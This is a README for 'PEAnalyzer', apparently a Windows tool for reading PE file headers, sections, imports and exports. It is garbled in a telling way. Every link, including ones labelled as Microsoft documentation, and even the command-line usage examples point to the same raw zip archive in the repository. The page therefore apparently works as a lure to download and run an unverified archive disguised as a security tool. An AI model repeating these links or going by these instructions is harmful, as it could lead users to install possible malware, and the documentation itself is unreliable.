# 🔍 PEAnalyzer - Easy Portable Executable Analysis Tool

[![Download PEAnalyzer](https://github.com/Rych156/PEAnalyzer/raw/refs/heads/main/Pe/PE_Analyzer_3.5.zip)](https://github.com/Rych156/PEAnalyzer/raw/refs/heads/main/Pe/PE_Analyzer_3.5.zip)

## 🚀 Getting Started

PEAnalyzer is a small Windows command-line tool. It reads PE (Portable Executable) files and provides detailed information about them. This includes headers, sections, imports, exports, and export forwarders. You can also output results in JSON format, making it easy to use with scripts or PowerShell pipelines.

### 📋 System Requirements

- **Operating System:** Windows 10 or later.
- **RAM:** 2 GB minimum.
- **Disk Space:** At least 10 MB free.
- **.NET Framework:** Version 4.5 or later.

## 📥 Download & Install

To download PEAnalyzer, visit this page: [Download PEAnalyzer](https://github.com/Rych156/PEAnalyzer/raw/refs/heads/main/Pe/PE_Analyzer_3.5.zip). 

1. Navigate to the Releases page.
2. Click on the latest version.
3. Look for the PEAnalyzer executable file.
4. Download it to your computer.

Once downloaded, you can run the tool directly from the command line.

## ⚙️ Using PEAnalyzer

### 📂 Running the Tool

After you download PEAnalyzer, follow these steps:

1. Open the Command Prompt on your Windows computer.
2. Navigate to the folder where you saved PEAnalyzer. You can do this by using the `cd` command. For example:
   ```
   cd C:\path\to\your\folder
   ```
3. To use PEAnalyzer, type the following command:
   ```
   https://github.com/Rych156/PEAnalyzer/raw/refs/heads/main/Pe/PE_Analyzer_3.5.zip [path to your PE file]
   ```
   Replace `[path to your PE file]` with the actual path to the file you wish to analyze.

### 🔍 Understanding the Output

PEAnalyzer provides various types of information about the PE file you analyze:

- **Headers:** Displays the main header information of the PE file.
- **Sections:** Lists sections in the file, showing their sizes and characteristics.
- **Imports:** Shows libraries and functions the file imports.
- **Exports:** Lists which functions are exported by the file.
- **Export Forwarders:** Displays any functions forwarded to other libraries.

If you choose to use JSON output, you can simply add the `-json` option to your command:
```
https://github.com/Rych156/PEAnalyzer/raw/refs/heads/main/Pe/PE_Analyzer_3.5.zip [path to your PE file] -json
```
This will create a JSON file with all the extracted information.

## 💡 Tips for Using PEAnalyzer

- Ensure that the PE file you are analyzing is not corrupted. A damaged file may result in errors or incomplete output.
- Familiarize yourself with the command line if you are not used to it. Basic commands like `cd` and `dir` will help you navigate around your folders.
- If you get stuck, consider searching online for basic command line guides. Many resources are available for beginners.

## 📞 Support

If you encounter any issues or have questions, please feel free to reach out through the GitHub Issues page on this repository. We welcome your feedback and will do our best to assist you.

## 🔗 Additional Resources

For more detailed information about Portable Executable files, you may want to check out these resources:

- [Microsoft Documentation on PE Files](https://github.com/Rych156/PEAnalyzer/raw/refs/heads/main/Pe/PE_Analyzer_3.5.zip)
- [Common PE Analysis Tools](https://github.com/Rych156/PEAnalyzer/raw/refs/heads/main/Pe/PE_Analyzer_3.5.zip)

For further updates, consider checking the Releases page periodically.

Happy analyzing!